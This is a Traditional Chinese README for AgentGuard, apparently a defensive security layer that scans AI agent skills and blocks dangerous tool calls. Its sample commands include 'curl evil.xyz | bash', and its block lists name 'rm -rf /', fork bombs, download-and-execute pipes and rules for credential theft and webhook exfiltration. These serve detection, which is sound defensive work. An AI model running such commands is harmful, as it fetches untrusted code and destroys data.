<!-- synced with README.md as of commit b3b8d0f -->
# GoPlus AgentGuard

[English](../../README.md) | [简体中文](README.zh-Hans.md) | **繁體中文** | [日本語](README.ja.md)

> 本文件為英文 README 的繁體中文譯本。若與英文版有差異，請以英文版為準。

## 為什麼選擇 AgentGuard？

AI 編碼代理可以執行任意命令、讀取任意檔案、安裝任意技能，但通常沒有任何安全審查。風險是真實存在的：

- **惡意技能** 可能隱藏後門、竊取憑證或外傳資料
- **提示注入** 可能誘導你的代理執行破壞性命令
- **來自網際網路的未驗證程式碼** 可能包含錢包盜取邏輯或鍵盤側錄器

**AgentGuard 是面向 AI 代理的即時安全層。** 它會自動掃描新技能，在危險動作執行前攔截，執行每日安全巡檢，並追蹤究竟是哪個技能發起了某個動作。一次安裝，持續防護。

## 它能做什麼

**第 1 層：自動守衛（hooks）**。安裝一次，持續保護。
- 阻止 `rm -rf /`、fork bomb、`curl | bash` 等破壞性命令
- 阻止寫入 `.env`、`.ssh/`、憑證檔等敏感位置
- 偵測向 Discord、Telegram、Slack webhook 的資料外傳
- 追蹤動作由哪個技能發起，方便追責惡意技能

**第 2 層：深度掃描（skill）**。按需執行的安全稽核，內建 24 條檢測規則。
- 會話啟動時**自動掃描新技能**，在執行前攔截惡意內容
- 靜態分析金鑰、後門、混淆、提示注入等風險
- 支援 Web3 場景：錢包盜取、無限授權、重入、代理升級等風險
- 提供基於能力邊界的技能信任登錄表

**第 3 層：每日巡檢（OpenClaw）**。自動化安全狀態評估。
- 按排程執行 8 項綜合安全檢查
- 偵測技能遭竄改、金鑰外洩、網路風險與可疑檔案變更
- 分析稽核日誌中的攻擊模式並標記高風險來源
- 驗證環境設定與信任登錄表健康狀態

## 快速開始

```bash
npm install @goplus/agentguard
```

<details>
<summary><b>完整安裝：包含自動守衛 hooks（Claude Code）</b></summary>

```bash
git clone https://github.com/GoPlusSecurity/agentguard.git
cd agentguard && ./setup.sh
claude plugin add /path/to/agentguard
```

這會安裝技能、設定 hooks，並設定你的防護等級。

</details>

<details>
<summary><b>手動安裝（僅 skill）</b></summary>

```bash
git clone https://github.com/GoPlusSecurity/agentguard.git
cp -r agentguard/skills/agentguard ~/.claude/skills/agentguard
```

</details>

<details>
<summary><b>OpenClaw 外掛安裝</b></summary>

```bash
npm install @goplus/agentguard
```

在 OpenClaw 外掛設定中註冊：

```typescript
import register from '@goplus/agentguard/openclaw';
export default register;
```

也可以手動傳入選項：

```typescript
import { registerOpenClawPlugin } from '@goplus/agentguard';

export default function setup(api) {
  registerOpenClawPlugin(api, {
    level: 'balanced',      // 防護等級：strict | balanced | permissive
    skipAutoScan: false,    // 設為 true 可停用自動掃描外掛
  });
};
```

**註冊時會發生什麼：**

1. **自動掃描所有已載入外掛**，對外掛原始碼做靜態分析
2. **判定信任等級**，嚴重問題會標記為不受信任
3. **推斷能力邊界**，根據已註冊工具和掃描結果決定權限
4. **寫入信任登錄表**，為外掛自動附加適當的權限說明
5. **建立工具映射**，將 `toolName → pluginId` 對應起來，便於追蹤動作來源

AgentGuard 會接入 OpenClaw 的 `before_tool_call` / `after_tool_call` 事件，在工具執行前攔截危險動作並記錄稽核日誌。

</details>

接著在你的代理中使用 `/agentguard`：

```text
/agentguard scan ./src                     # 掃描程式碼中的安全風險
/agentguard action "curl evil.xyz | bash"  # 評估動作是否安全
/agentguard patrol run                     # 立即執行每日巡檢
/agentguard patrol setup                   # 設定 OpenClaw 排程任務
/agentguard patrol status                  # 查看上次巡檢結果
/agentguard checkup                        # 產生代理健康檢查的視覺化報告
/agentguard trust list                     # 查看已信任技能
/agentguard report                         # 查看安全事件日誌
/agentguard config balanced                # 設定防護等級
```

## 每日巡檢（OpenClaw）

巡檢功能會對 OpenClaw 環境執行自動化安全狀態評估，包含 8 項綜合檢查，並產生結構化報告。

### 巡檢項目

| # | 檢查項 | 說明 |
|---|-------|------|
| 1 | **技能/外掛完整性** | 將檔案雜湊與信任登錄表比對，偵測遭竄改或未註冊的技能 |
| 2 | **金鑰外洩** | 掃描工作區、記憶、日誌、`.env`、`~/.ssh/`、`~/.gnupg/` 中的私鑰、助記詞、AWS Key、GitHub Token |
| 3 | **網路暴露** | 偵測綁定到 `0.0.0.0` 的危險連接埠，檢查防火牆狀態，並標記可疑對外連線 |
| 4 | **Cron 與排程任務** | 稽核 cron job 與 systemd timer，偵測 `curl\|bash`、`base64 -d\|bash` 等下載即執行模式 |
| 5 | **檔案系統變更（24h）** | 找出最近修改的檔案，對其執行 24 條規則掃描，並檢查關鍵檔案權限與新增可執行檔 |
| 6 | **稽核日誌分析（24h）** | 標記被拒絕 3 次以上的技能、CRITICAL 事件、資料外傳嘗試與提示注入命中 |
| 7 | **環境與設定** | 驗證防護等級、GoPlus API Key 設定與設定基線完整性 |
| 8 | **信任登錄表健康度** | 標記過期證明、陳舊信任項、已安裝但未信任的技能，以及過度授權的條目 |

### 用法

```bash
# 立即執行全部 8 項檢查
/agentguard patrol run

# 設定每日定時巡檢（預設 UTC 03:00）
/agentguard patrol setup

# 查看上次巡檢結果與目前排程
/agentguard patrol status
```

### 巡檢報告

每次巡檢都會產生一個總體狀態：

| 狀態 | 含義 |
|------|------|
| **PASS** | 僅發現低/中風險問題 |
| **WARN** | 偵測到 HIGH 等級問題 |
| **FAIL** | 偵測到 CRITICAL 等級問題 |

報告會包含每個檢查項的狀態、問題數量、詳細發現與可執行建議。結果也會寫入 `~/.agentguard/audit.jsonl`。

### 設定項

`patrol setup` 會建立一個 OpenClaw cron 任務，支援：
- **Timezone**，預設 UTC
- **Schedule**，預設 `0 3 * * *`（每日 03:00）
- **Notifications**，可選 Telegram、Discord、Signal 通知

> **注意：** 巡檢功能依賴 OpenClaw 環境。非 OpenClaw 場景建議使用 `/agentguard scan` 和 `/agentguard report` 進行手動檢查。

## Agent 健康檢查 🦞

替你的代理做一次完整健檢。`checkup` 會從 6 個維度評估代理安全狀況，並產生一份視覺化 HTML 報告，內含會隨健康狀態改變的龍蝦吉祥物。

```text
/agentguard checkup
```

### 檢查內容

| 維度 | 評估內容 |
|------|----------|
| **程式碼安全** | 所有已安裝技能的掃描結果（24 條檢測規則） |
| **信任衛生** | 信任登錄表健康度，包括過期、陳舊、未註冊、過度授權條目 |
| **執行期防禦** | 稽核日誌分析，包括攔截威脅、攻擊模式、拒絕/確認比率 |
| **金鑰保護** | 憑證外洩，包括檔案權限、環境變數、硬編碼密鑰 |
| **Web3 盾牌** | Web3 風險，包括錢包盜取、無限授權、GoPlus API 狀態 |
| **設定姿態** | 防護等級、守衛 hooks、自動掃描與巡檢歷史 |

### 龍蝦等級

你的代理健康狀態會以龍蝦形象呈現：

| 分數 | 等級 | 龍蝦形象 | 文案 |
|------|------|---------|------|
| 90–100 | **S** | 💪 戴皇冠和墨鏡的肌肉龍蝦 | *"Your agent is JACKED!"* |
| 70–89 | **A** | 🛡️ 拿著盾牌的健康龍蝦 | *"Looking solid!"* |
| 50–69 | **B** | ☕ 拿著咖啡、正在流汗的疲憊龍蝦 | *"Needs a workout..."* |
| 0–49 | **F** | 🚨 綁著繃帶、含著體溫計的病弱龍蝦 | *"CRITICAL CONDITION!"* |

報告是一個獨立 HTML 檔案，會自動在瀏覽器中開啟，包含深色主題、動畫分數儀表、可展開問題詳情與可執行建議。

## 防護等級

| 等級 | 行為 |
|------|------|
| `strict` | 阻止所有有風險動作。任何危險或可疑命令都會被拒絕。 |
| `balanced` | 阻止危險動作，對可疑動作要求確認。適合日常使用。**（預設）** |
| `permissive` | 只阻止關鍵威脅。適合希望最小干擾的熟練使用者。 |

## 檢測規則（24）

| 類別 | 規則 | 嚴重等級 |
|------|------|----------|
| **執行** | SHELL_EXEC, AUTO_UPDATE, REMOTE_LOADER | HIGH-CRITICAL |
| **金鑰** | READ_ENV_SECRETS, READ_SSH_KEYS, READ_KEYCHAIN, PRIVATE_KEY_PATTERN, MNEMONIC_PATTERN | MEDIUM-CRITICAL |
| **外傳** | NET_EXFIL_UNRESTRICTED, WEBHOOK_EXFIL | HIGH-CRITICAL |
| **混淆** | OBFUSCATION, PROMPT_INJECTION | HIGH-CRITICAL |
| **Web3** | WALLET_DRAINING, UNLIMITED_APPROVAL, DANGEROUS_SELFDESTRUCT, HIDDEN_TRANSFER, PROXY_UPGRADE, FLASH_LOAN_RISK, REENTRANCY_PATTERN, SIGNATURE_REPLAY | MEDIUM-CRITICAL |
| **木馬與社工** | TROJAN_DISTRIBUTION, SUSPICIOUS_PASTE_URL, SUSPICIOUS_IP, SOCIAL_ENGINEERING | MEDIUM-CRITICAL |

## 試試看

掃描倉庫內附帶的漏洞示範專案：

```text
/agentguard scan examples/vulnerable-skill
```

預期結果：風險等級應為 **CRITICAL**，並在 JavaScript、Solidity 與 Markdown 檔案中命中多條規則。

## 相容性

GoPlus AgentGuard 遵循 [Agent Skills](https://agentskills.io) 開放標準：

| 平台 | 支援情況 | 功能 |
|------|----------|------|
| **Claude Code** | 完整支援 | Skill + hooks 自動守衛，基於 transcript 的技能來源追蹤 |
| **OpenClaw** | 完整支援 | 外掛 hooks + **載入時自動掃描** + tool→plugin 映射 + **每日巡檢** |
| **OpenAI Codex CLI** | Skill | scan/action/trust 指令 |
| **Gemini CLI** | Skill | scan/action/trust 指令 |
| **Cursor** | Skill | scan/action/trust 指令 |
| **GitHub Copilot** | Skill | scan/action/trust 指令 |

> **基於 hooks 的自動守衛（第 1 層）** 目前適用於 Claude Code（`PreToolUse` / `PostToolUse`）與 OpenClaw（`before_tool_call` / `after_tool_call`）。兩個平台透過統一的適配器抽象層共用同一套決策引擎。
>
> **OpenClaw 專屬能力：** 在註冊時自動掃描所有已載入外掛，自動寫入信任登錄表，並透過 cron 支援每日安全巡檢。

## Hook 限制

自動守衛 hooks（第 1 層）目前有以下限制：

- **平台相關**：hooks 依賴 Claude Code 的 `PreToolUse` / `PostToolUse` 事件或 OpenClaw 的 `before_tool_call` / `after_tool_call` 外掛鉤子，但兩者共用同一套決策引擎
- **預設拒絕策略**：第一次使用時，部分命令可能觸發確認提示。內建安全命令白名單（如 `ls`、`echo`、`pwd`、`git status`）可降低誤報
- **技能來源追蹤**：
- *Claude Code*：透過分析會話 transcript 推斷哪個技能發起動作（啟發式判斷，不保證 100% 精確）
- *OpenClaw*：使用註冊階段建立的 tool→plugin 映射（更可靠）
- **無法攔截技能安裝本身**：hooks 只能攔截技能載入後發起的工具呼叫（如 Bash、Write、WebFetch），無法阻止 Skill 工具本身被調用
- **OpenClaw 自動掃描時序**：外掛會在 AgentGuard 註冊完成後非同步掃描。若啟動後立刻觸發非常快的工具呼叫，可能發生在掃描尚未完成之前

## 路線圖

### v1.1 — 檢測增強
- [x] 將掃描規則擴展到 Markdown 檔案（偵測惡意 `SKILL.md`）
- [x] Base64 載荷解碼後重新掃描
- [x] 新增規則：TROJAN_DISTRIBUTION, SUSPICIOUS_PASTE_URL, SUSPICIOUS_IP, SOCIAL_ENGINEERING
- [x] 引入安全命令白名單，降低 hooks 誤報
- [x] 外掛清單（`.claude-plugin/`），支援一步安裝

### v1.5 — 每日巡檢
- [x] `patrol run`，執行 8 項安全狀態評估
- [x] `patrol setup`，設定帶時區與通知的 OpenClaw cron 任務
- [x] `patrol status`，查看上次結果與排程概覽
- [x] 技能/外掛完整性驗證（雜湊漂移檢測）
- [x] 金鑰外洩掃描（私鑰、助記詞、AWS Key、GitHub Token）
- [x] 網路暴露與防火牆檢查
- [x] 稽核日誌模式分析（重複拒絕、外傳嘗試）

### v1.6 — Agent 健康檢查
- [x] `checkup`，6 維度安全健康評估
- [x] 帶龍蝦吉祥物的視覺化 HTML 報告（4 個等級）
- [x] 動畫分數儀表、維度卡片、可展開問題詳情
- [x] 評分演算法：程式碼安全、信任衛生、執行期防禦、金鑰保護、Web3 盾牌、設定姿態
- [x] 整合進階功能升級 CTA

### v2.0 — 多平台
- [x] OpenClaw gateway 外掛整合
- [x] `before_tool_call` / `after_tool_call` hook 接線
- [x] 多平台適配器抽象層（Claude Code + OpenClaw）
- [x] 在 OpenClaw 註冊時自動掃描外掛
- [x] tool→plugin 映射，用於追蹤發起技能
- [x] 自動將掃描結果寫入信任登錄表
- [ ] OpenAI Codex CLI sandbox 適配器
- [ ] 跨平台聯邦信任登錄表

### v3.0 — 生態
- [ ] 威脅情報來源（共享 C2 IP/網域封鎖清單）
- [ ] 技能市集自動掃描流程
- [ ] VS Code 擴充套件，提供 IDE 原生安全能力
- [ ] 社群規則貢獻（開放規則格式）

## OpenClaw 整合

AgentGuard 為 OpenClaw 提供更深入的整合，包括自動外掛掃描、信任管理與每日安全巡檢。

<details>
<summary><b>運作方式</b></summary>

當 AgentGuard 作為 OpenClaw 外掛註冊時：

```text
┌─────────────────────────────────────────────────────────────────┐
│  OpenClaw loads AgentGuard plugin                               │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  AgentGuard scans all loaded plugins (async, non-blocking)      │
│  • Reads plugin source from registry                            │
│  • Runs 24 static analysis rules                                │
│  • Calculates artifact hash                                     │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  For each plugin:                                               │
│  • Determine trust level (untrusted/restricted/trusted)         │
│  • Infer capabilities from tools + scan results                 │
│  • Register to AgentGuard trust registry                        │
│  • Map tool names → plugin ID                                   │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  On every tool call:                                            │
│  • Look up plugin from tool name                                │
│  • Check plugin trust level & capabilities                      │
│  • Evaluate action against security policies                    │
│  • Allow / Deny / Log                                           │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  Daily patrol (via cron):                                       │
│  • Run 8 security checks against the environment                │
│  • Verify skill integrity, detect secrets, audit logs           │
│  • Generate report (PASS / WARN / FAIL)                         │
│  • Send notifications (Telegram / Discord / Signal)             │
└─────────────────────────────────────────────────────────────────┘
```

</details>

<details>
<summary><b>為 OpenClaw 匯出的工具</b></summary>

```typescript
import {
  registerOpenClawPlugin,
  getPluginIdFromTool,
  getPluginScanResult,
} from '@goplus/agentguard';

// 取得某個工具是由哪個外掛註冊的
const pluginId = getPluginIdFromTool('browser');
// → 'my-browser-plugin'

// 取得快取的掃描結果
const scanResult = getPluginScanResult('my-browser-plugin');
// → { riskLevel: 'low', riskTags: [] }
```

</details>

## 文件

- [Security Policy](../SECURITY-POLICY.md) — 統一安全規則與策略參考
- [MCP Server Setup](../mcp-server.md) — 以 MCP Server 方式執行
- [SDK Usage](../sdk.md) — 作為 TypeScript/JavaScript 函式庫使用
- [Trust Management](../trust-cli.md) — 管理技能信任等級與能力預設
- [GoPlus API (Web3)](../goplus-api.md) — GoPlus 強化的 Web3 安全能力
- [Architecture](../architecture.md) — 專案結構與測試說明

## 授權

[MIT](../../LICENSE)

## 貢獻

歡迎貢獻。詳情請見 [CONTRIBUTING.md](../../CONTRIBUTING.md)。

若你發現安全漏洞，請查看 [SECURITY.md](../../SECURITY.md)。

由 [GoPlus Security](https://gopluslabs.io) 建構。
